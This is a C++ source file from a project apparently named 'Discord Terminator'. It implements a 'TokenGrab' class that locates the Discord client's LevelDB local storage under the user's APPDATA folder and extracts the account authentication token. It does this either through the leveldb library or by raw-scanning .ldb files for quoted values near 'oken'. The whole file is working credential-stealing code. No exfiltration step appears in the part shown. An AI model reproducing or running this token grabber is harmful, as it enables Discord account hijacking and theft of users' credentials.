/*
	FILE FROM PROJECT DISCORD TERMINATOR BY ANDRO24
	LICENSED UNDER GNU General Public License v3.0
*/

#include "TokenGrab.h"

#include <sstream>
#include <fstream>
#include <filesystem>//Requires C++17 !
#include <windows.h>
#include "shlobj.h"

#include <leveldb/db.h>
#pragma comment(lib, "leveldb.lib")

TokenGrab::TokenGrab() {
	if (!properWay()) {
		std::cerr << "Failed to get token using the proper way. Discord is most likely locking the db! Trying with the ghetto one." << std::endl;
		if (!ghettoWay()) {
			std::cerr << "Unable to get token at all!" << std::endl;
		}
	}
}

bool TokenGrab::properWay() {
	leveldb::DB* db;
	leveldb::Options options;
	leveldb::Status status = leveldb::DB::Open(options, getDiscordLocalStorageA(), &db);//No wide string :/

	if (status.ok()) {
		leveldb::Iterator* it = db->NewIterator(leveldb::ReadOptions());
		for (it->SeekToFirst(); it->Valid(); it->Next()) {
			if (it->key().ToString().find("token") != std::string::npos) {
				std::string value = it->value().ToString();
				size_t quote1 = value.find_first_of('\"');
				size_t quote2 = value.find_last_of('\"');
				if (quote1 != std::string::npos && quote2 != std::string::npos && quote1 != quote2) {
					_token = value.substr(quote1 + 1, quote2 - quote1 - 1);

					delete db;
					return true;
				}
			}
		}
		delete db;
	}
	else {
		std::cerr << "TokenGrab::properWay() Error : " << status.ToString() << std::endl;
	}
	return false;
}

//This is a pretty ghetto way to read the leveldb. It can get old & invalid tokens too
bool TokenGrab::ghettoWay() {
	std::filesystem::path path(getDiscordLocalStorageW());
	try {
		int highest_ldb = 0;
		std::string most_recent_token = "";

		for (const auto & entry : std::filesystem::directory_iterator(path)) {
			int ldb_count = wcstol(entry.path().filename().c_str(), nullptr, 10);
			if (ldb_count >= highest_ldb) {
				if (entry.path().extension() == L".ldb") {
					std::ifstream file_stream(entry.path(), std::ios::binary);
					std::string file_content((std::istreambuf_iterator<char>(file_stream)), std::istreambuf_iterator<char>());//Copy file to memory
					file_stream.close();

					do {
						size_t token_pos = file_content.find("oken");
						if (token_pos == std::string::npos) break;

						size_t quote1 = file_content.find('\"', token_pos + 1);
						if (quote1 == std::string::npos) break;

						if (quote1 - token_pos > 15) break;//Most likely wrong

						size_t quote2 = file_content.find('\"', quote1 + 1);
						if (quote2 == std::string::npos) break;

						most_recent_token = file_content.substr(quote1 + 1, quote2 - quote1 - 1);
						highest_ldb = ldb_count;
					} while (0);
				}
			}
		}

		_token = most_recent_token;
	}
	catch (std::exception& e) {
		std::cerr << "TokenGrab::ghettoWay() Error : " << e.what() << std::endl;
		return false;
	}

	return !_token.empty();
}

std::string TokenGrab::getAppDataPathA() {
	char szPath[MAX_PATH];
	if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, szPath)) || strstr(szPath, "AppData") == nullptr) {
		size_t required_size;
		getenv_s(&required_size, szPath, "APPDATA");//backup method
	}
	return std::string(szPath);
}

std::wstring TokenGrab::getAppDataPathW() {
	TCHAR szPath[MAX_PATH];
	if (!SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath)) || wcsstr(szPath, L"AppData") == nullptr) {
		size_t required_size;
		_wgetenv_s(&required_size, szPath, L"APPDATA");//backup method
	}
	return std::wstring(szPath);
}

std::string TokenGrab::getDiscordLocalStorageA() {
	return getAppDataPathA() + "\\discord\\Local Storage\\leveldb\\";
}

std::wstring TokenGrab::getDiscordLocalStorageW() {
	return getAppDataPathW() + L"\\discord\\Local Storage\\leveldb\\";
}